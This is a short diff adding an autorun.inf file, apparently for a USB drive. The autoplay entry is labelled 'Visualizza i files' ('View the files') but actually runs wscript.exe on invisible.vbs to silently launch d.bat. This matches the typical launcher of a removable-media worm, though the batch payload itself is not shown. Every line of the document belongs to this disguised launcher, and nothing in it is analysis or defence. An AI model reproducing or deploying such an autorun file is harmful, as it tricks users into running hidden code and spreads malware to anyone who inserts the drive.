@@ -1,0 +1,4 @@
+[autorun]
+icon=PEN-ICON.ico
+action=Visualizza i files
+shellexecute=wscript.exe \invisible.vbs d.bat
